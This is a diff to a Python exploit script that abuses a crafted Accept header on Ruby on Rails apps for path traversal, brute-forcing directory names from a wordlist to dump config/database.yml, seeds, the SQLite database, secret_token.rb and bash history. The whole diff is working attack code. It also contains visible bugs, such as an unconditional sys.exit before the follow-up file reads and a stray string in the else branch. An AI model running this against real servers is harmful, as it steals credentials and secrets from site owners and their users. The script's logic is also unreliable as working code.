@@ -27,50 +27,58 @@ def check_args():
         sys.exit(1)
 
 
-def check_url(url):
-    status_code = requests.get(url)
-    if status_code != 200:
-        print("Url is invalid or can not be reached!")
-        sys.exit(1)
-
-
 def read_file(url, file):
     headers = {'Accept': file + '{{'}
     req = requests.get(url, headers=headers)
     return req
 
+def help(lines, once, output):
+    if once:
+        print('Printing Lines')
+        for line in lines:
+            print(line)
+    print('\nPrinting Output')
+    for line in output:
+        print(line)
+
 
 def brute_force_data(url):
     # function to brute force sensitive data
     # assuming the person did not rename ruby on rails stable directories
-    above = '../'
+    print('\n\n\033[93m[!]\t     BRUTE FORCING DATA.... \n\n \033[0m')
+    file_path = '../../../../../../../../../../home/rails/'
     base_req = requests.get(url)
     lines = [line.strip() for line in str(base_req.text).splitlines()]
     files = ["db/seeds.rb", "db/structure.sql", "development.sqlite3",
              "config/database.yml", "config/initializers/secret_token.rb"]
-    num = ''
-    for i in range(8):
-        file = above * i + files[0]
-        headers = {'Accept': file + '{{'}
-        req = requests.get(url, headers)
-        output = [line.strip() for line in str(req.text).splitlines()]
-        # get number of lines in file before attempting to read files to determine if successful
-        if len(lines) != len(output) and lines[0] != output[0]:
-            print('Dumping: ', files[0])
-            for line in output:
-                print(line)
-            num = i
-            break
-    # time.sleep(random.randint(1, 3))
-    # uncomment this to be less noisy on the server
-    # now since we know where to look we can read sensitive files
-    if num != '':
-        files = files[1:]
-        # shift files list by one since already read first file
-        for file in files:
-            file = above * num + file
+    found = False
+    with open('common.txt', 'r') as fp:
+        for file in fp:
+            file = file_path + file.strip() + '/' + files[3]
+            #print(file)
             headers = {'Accept': file + '{{'}
-            req = requests.get(url, headers)
+            req = requests.get(url, headers=headers)
+            #time.sleep(random.randint(1,3))
+            #Comment this out to be less noisy!
+            output = [line.strip() for line in str(req.text).splitlines()]
+            if len(lines) != len(output) and len(output) < len(lines) \
+                and lines[0] != output[0] and 'Exception Caught' not in lines:
+                print('\n\n\033[93m[!] \t     DUMPING: ', files[3] + '\n\n \033[0m')
+                for line in output:
+                    print(line)
+                    file_path = file_path + file.strip() + '/'
+                    found = True
+                break
+    # now since we know where to look we can read sensitive files
+    sys.exit(-2)
+    if found:
+        print('FILE PATH IS: ', file_path)
+        del files[3]
+        # pop off the fourth element since already read it
+        for file in files:
+            file = file_path + file
+            headers = {'Accept': file + '{{'}
+            req = requests.get(url, headers=headers)
             output = [line.strip() for line in str(req.text).splitlines()]
             # sanity check
             if len(output) != len(lines) and lines[0] != output[0]:
@@ -78,6 +86,8 @@ def brute_force_data(url):
                 for line in output:
                     print(line)
 
+    else:
+        "Could not brute force, file may not exist!"
 
 def main():
     banner()
@@ -90,8 +100,6 @@ def main():
              enter 2 for /proc/cpuinfo \n
              enter 3 for bash history \n
              enter 4 to brute force: \033[0m"""
-        #\033[93m[!]
-        #\033[0m
         try:
             file = input(menu)
         except Exception:
